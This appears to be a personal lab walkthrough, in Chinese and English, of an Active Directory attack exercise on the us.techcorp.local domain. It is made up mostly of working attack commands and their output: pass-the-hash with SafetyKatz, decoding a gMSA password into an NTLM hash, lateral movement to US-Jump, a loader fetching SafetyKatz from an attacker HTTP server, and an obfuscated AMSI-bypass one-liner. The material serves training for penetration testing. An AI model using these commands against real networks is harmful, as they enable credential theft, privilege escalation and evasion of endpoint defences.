Task
•  Enumerate gMSAs in the us.techcorp.local domain.
•  Enumerate the principals that can read passwords from any gMSAs.
•  Compromise one such principal and retrieve the password from a gMSA.
•  Find if the gMSA has high privileges on any machine and extract credentials from that machine.

# Enumerate gMSAs in the us.techcorp.local domain.

使用 ADModule
```
PS C:\ad\Tools> Get-ADServiceAccount -Filter *


DistinguishedName : CN=jumpone,CN=Managed Service Accounts,DC=us,DC=techcorp,DC=local
Enabled           : True
Name              : jumpone
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : 1ac6c58e-e81d-48a8-bc42-c768d0180603
SamAccountName    : jumpone$
SID               : S-1-5-21-210670787-2521448726-163245708-8601
UserPrincipalName :

```

# Enumerate the principals that can read passwords from any gMSAs.

```
PS C:\ad\Tools> Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

PrincipalsAllowedToRetrieveManagedPassword
------------------------------------------
{CN=provisioning svc,CN=Users,DC=us,DC=techcorp,DC=local}
```

# Compromise one such principal and retrieve the password from a gMSA.

根据在US-MAILMGMT收集到的provisioningsvc的哈希，pth一个shell
```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /run:cmd.exe" "exit"
```
# Find if the gMSA has high privileges on any machine and extract credentials from that machine.

在上面步骤出来的cmd下依次执行
```
C:\Windows\system32>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\Windows\system32>
```

使用 DSInternals module，解码password并且转成ntlm

```
PS C:\Windows\system32> $Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
PS C:\Windows\system32> Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
PS C:\Windows\system32> $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
PS C:\Windows\system32> ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword
24ea295f3c05aefc8c29d07992cdcc4c
PS C:\Windows\system32>
```


使用上面得到的ntlm开启一个新的shell

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:24ea295f3c05aefc8c29d07992cdcc4c /run:powershell.exe" "exit"
```

在上面命令得到的新shell下，执行
```
PS C:\ad\Tools> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad\Tools> Find-PSRemotingLocalAdminAccess -Verbose
VERBOSE: Trying to run a command parallely on provided computers list using PSRemoting .
US-Jump
```

现在可以横向到US-Jump
```
PS C:\ad\Tools> winrs -r:us-jump cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\jumpone$>whoami
whoami
us\jumpone$

C:\Users\jumpone$>hostname
hostname
US-Jump
```

在学生机传文件到us-jump
```
echo F | xcopy C:\AD\Tools\Loader.exe \\us-jump\C$\Users\Public\Loader.exe /Y
```

在学生机开启一个http服务

```
python -m SimpleHTTPServer 80
```


在jump执行,发现不能运行
```
C:\Users\jumpone$>C:\Users\Public\Loader.exe -path http://192.168.100.138/SafetyKatz.exe
C:\Users\Public\Loader.exe -path http://192.168.100.138/SafetyKatz.exe
The system cannot execute the specified program.
```

转成powershell，bypass amsi也报错
```
PS C:\Users\jumpone$> S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
Cannot invoke method. Method invocation is supported only on core types in this language mode.
At line:1 char:96
+ ... ,'rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly" ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
```


因为是在 Constrained Language Mode下
```
PS C:\Users\jumpone$>  $ExecutionContext.SessionState.LanguageMode
 $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

这可能是因为有Applocker，如果有Applocker，那可以去白名单里 执行

由于Applocker是在注册表中，如果下面命令报错，表明没有Applocker

```
PS C:\Users\jumpone$> reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
ERROR: The system was unable to find the specified registry key or value.
```
报error，没有Applocker

wmic也不可以用
```
PS C:\Users\jumpone$> wmic
wmic
Program 'WMIC.exe' failed to run: Your organization used Device Guard to block this app. Contact your support person
for more infoAt line:1 char:1
+ wmic
+ ~~~~.
At line:1 char:1
+ wmic
+ ~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```